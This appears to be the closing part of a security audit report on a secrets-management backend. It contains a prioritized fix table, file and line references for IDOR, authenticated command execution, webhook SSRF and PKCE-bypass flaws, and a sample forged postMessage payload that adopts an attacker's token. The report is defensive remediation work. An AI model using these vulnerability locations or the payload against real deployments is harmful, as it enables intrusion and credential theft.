| 1 | **Central project-access middleware** to fix A01-F1/F3/F4/F5/F6/F7/F8/F9/F10 in one place. Compose `JWTAuthMiddleware` / `APIKeyAuthMiddleware` with a new `RequireProjectAccess(projectIDParam string)` that (a) for JWTs, checks user owns or is a member of the project; (b) for API keys, checks `api_key_project_id == :id` and `api_key_environment` constraints. Mount on every `/projects/:id/...` group. | **P1** | 2-3 days code + 1 day tests | Backend Engineer + Security Engineer review | None |
| 2 | **MCP entry-command sandbox / allowlist** (A03-F1). Reject any `EntryCommand` not on a server-side allowlist; reject shell metacharacters in `Fields`-tokenized parts; stop passing plaintext secrets via env to user-controlled binaries. | **P1** | 3-5 days | Backend Engineer + Security Engineer | Tied to MCP product spec; needs PM input |
| 3 | **Remove plaintext from `DiffEntry`** (A01-F4 / §5 delta). Replace `SourceValue/TargetValue` with `SourceHash/TargetHash` (HMAC with per-project audit key) so callers can detect change without seeing values. | **P1** | 0.5 day | Backend Engineer | None |
| 4 | **Embed widget origin allow-list** (A04-F2). Per `EMBED_ORIGIN_POLICY.md`; ship the `/projects/:id/embed-config` endpoint and update `frontend/src/embed/auth.ts`. | **P2** | 2 days backend + 1 day frontend | Backend + Frontend Engineer | Schema migration for `projects.allowed_embed_origins` |
| 5 | **Webhook SSRF guard** (A10-F1). Resolve URL hostname pre-flight; reject RFC1918, link-local, loopback, metadata IPs; HTTPS-only. | **P2** | 1 day | Backend Engineer | None |
| 6 | **Approver ≠ requester** (A04-F1 / FU#5). Service-layer check + DB CHECK constraint. | **P2** | 0.5 day | Backend Engineer | None |
| 7 | **OAuth public-client must use PKCE S256** (A04-F4/F5). Drop `plain` advertise, enforce non-empty `code_challenge` for public clients. | **P2** | 0.5 day | Backend Engineer | None |
| 8 | **`ks_` API key default expiry** (A07-F1 / FU#0k). 90d default, 365d ceiling, sentinel for "never" with admin opt-in audit row. | **P3** | 1 day + migration | Backend Engineer | Schema migration |
| 9 | **Audit emission for secret/project/apikey mutations** (A09-F2 / FU#0). Already tracked. | **P2** | 2-3 days | Backend Engineer | None |
| 10 | **`err.Error()` leak fix** (FU#0a). Adopt `httperror` package per `docs/ERROR_HANDLING_STANDARD.md`. | **P3** | 2-3 days (160 sites) | Backend Engineer | None |

**Not in top 10 but file in next sprint:** CSRF middleware (delete or wire), Dockerfile non-root, audit-log tamper-evidence design ADR, query-string redaction in logger, secret_versions cascade verification, JWT secret minimum length, login lockout per-account.

---

## Appendix A — Files and line refs cited

- `backend/internal/api/middleware.go:59-120` — auth middleware
- `backend/internal/api/middleware.go:107-112` — API-key context set
- `backend/internal/api/router.go:75-85` — secret group wiring
- `backend/internal/api/handlers_secret.go:20-137` — secret CRUD (no project-access check)
- `backend/internal/api/handlers_envfile.go:19-67` — env import/export (no project-access check)
- `backend/internal/api/handlers_promotion.go:60-85` — promotion Diff (no project-access check, plaintext leak path)
- `backend/internal/api/handlers_keyrotation.go:22-39` — rotate-keys IDOR
- `backend/internal/api/handlers_enterprise.go:31-220` — enterprise endpoints IDOR
- `backend/internal/api/handlers_version.go:36-150` — version handler IDOR (verifies secret↔project but not user↔project)
- `backend/internal/api/handlers_dependency.go:20-66` — dependency handler IDOR
- `backend/internal/api/handlers_intelligence.go:32-150` — intelligence handler IDOR
- `backend/internal/api/handlers_webhook.go:28-86` — webhook IDOR
- `backend/internal/api/handlers_agent.go:42-52` — **only** consumer of `api_key_project_id`
- `backend/internal/api/handlers_mcp_gateway.go:327-339` — `exec.Command` on DB-stored entry command
- `backend/internal/api/csrf.go:13-55` — defined but unmounted
- `backend/internal/api/security_headers.go:14-22` — strong CSP (pass)
- `backend/internal/auth/auth.go:50-52` — HMAC-only JWT (pass on alg confusion)
- `backend/internal/auth/apikey.go:21-32` — SHA-256 hashing
- `backend/internal/crypto/crypto.go:69-72` — random GCM nonce per encrypt (pass)
- `backend/internal/service/secret_service.go:41-183` — no ownership checks
- `backend/internal/service/promotion_service.go:131,140,357-364` — Diff plaintext, audit emission
- `backend/internal/service/promotion_service.go:215-240` — `ApprovePromotion` missing self-approval check
- `backend/internal/service/oauth_service.go:109-121, 249-255` — PKCE bypass for public clients, plain advertised
- `backend/internal/service/lease_service.go:94-102` — RevokeLease no owner check
- `backend/internal/service/webhook_service.go:136,158` — SSRF surface
- `backend/internal/models/models.go:142-150` — `DiffEntry` carries plaintext fields
- `backend/internal/config/config.go:76-87` — JWT secret no length check; prod-mode CORS guard ok
- `backend/internal/logging/gin_middleware.go:14,24` — query-string logged
- `backend/Dockerfile` — runs as root
- `backend/migrations/001_initial_schema.sql:66-77` — audit_log not tamper-evident
- `docker-compose.yml:25-26` — dev keys committed
- `frontend/src/embed/auth.ts:21-26, 33` — wildcard postMessage (confirmed exploitable)
- `frontend/src/api/client.ts:27-31` — JWT in localStorage
- `frontend/src/pages/HelpPage.tsx:1343` — `localStorage.getItem('jwt')` (key-name bug, FU#0h)
- `docs/THREAT_MODEL.md` v1.2.0 §1-§5 — rows referenced in §5 above

## Appendix B — Report-back checklist (for parent agent / Tech Lead)

1. **P1 Critical count:** **6.** Named:
   - A01-F1 Secret CRUD IDOR
   - A01-F2 API-key scope ignored (chain enabler)
   - A01-F3 env-export IDOR
   - A01-F4 promotion Diff IDOR + plaintext echo
   - A01-F5 key-rotation IDOR
   - A03-F1 MCP entry-command authenticated RCE
   - (Plus A01-F6 enterprise/intel IDOR family, treated as one finding instance; if scored separately = 7.)

2. **P2 High count:** **5.** Top 3:
   - A04-F2 Embed widget wildcard postMessage (confirmed exploitable)
   - A04-F1 Approver-can-be-requester (FU #5)
   - A10-F1 Webhook SSRF reaches IMDS

3. **Wildcard postMessage origin (`embed/auth.ts`) confirmed exploitable:** **Yes.** Inbound listener has no `ev.origin` check (`auth.ts:21-26`); outbound `postMessage(..., '*')` (`auth.ts:33`). A malicious embedding page can post `{type:'keepsave-auth', token:<attacker token>}` and the widget will adopt the attacker's identity. The exploit requires the legitimate user to load the malicious page; no other user interaction.

4. **`ks_` no-TTL gap security-class severity:** Standalone **P3 Medium** (long-lived credential is a hygiene issue, not an immediate exposure). **In combination with A01-F2 (API-key scope ignored), the chain rates P2 High** — a leaked or rotated-but-cached `ks_` key valid forever, usable across all projects, is a tenant-isolation breach masquerading as an operational concern. Recommend treating it as P2 in combination on the priority list.

5. **New STRIDE rows for `docs/THREAT_MODEL.md`:** Five new entries (see §5.2 above) — JWT lacks project bind (Section 2/E), Plaintext leak via Diff (Section 3/I), MCP tool execution as a new Section 6, Webhook SSRF (Section 1/I-extension), and Secret-versions retention (new Section 7). Plus four existing rows whose residual-risk should be downgraded (§5.1).
